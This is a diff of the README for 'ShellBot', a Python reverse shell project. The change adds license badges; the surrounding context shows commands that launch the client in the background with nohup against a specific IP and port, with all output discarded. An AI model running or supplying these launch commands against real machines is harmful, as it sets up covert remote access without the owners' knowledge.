@@ -1,4 +1,6 @@
 # ShellBot
+[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fsayak-brm%2FShellBot.svg?type=shield)](https://app.fossa.com/projects/git%2Bgithub.com%2Fsayak-brm%2FShellBot?ref=badge_shield)
+
 
 ##### An advanced reverse shell written in Python3.
 
@@ -51,3 +53,6 @@ nohup python3 client.py 15.48.158.15 1567 > /dev/null &
 
 nohup python3 client.py 15.48.158.15 1567 > /dev/null 2>&1 &
 ```
+
+## License
+[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fsayak-brm%2FShellBot.svg?type=large)](https://app.fossa.com/projects/git%2Bgithub.com%2Fsayak-brm%2FShellBot?ref=badge_large)
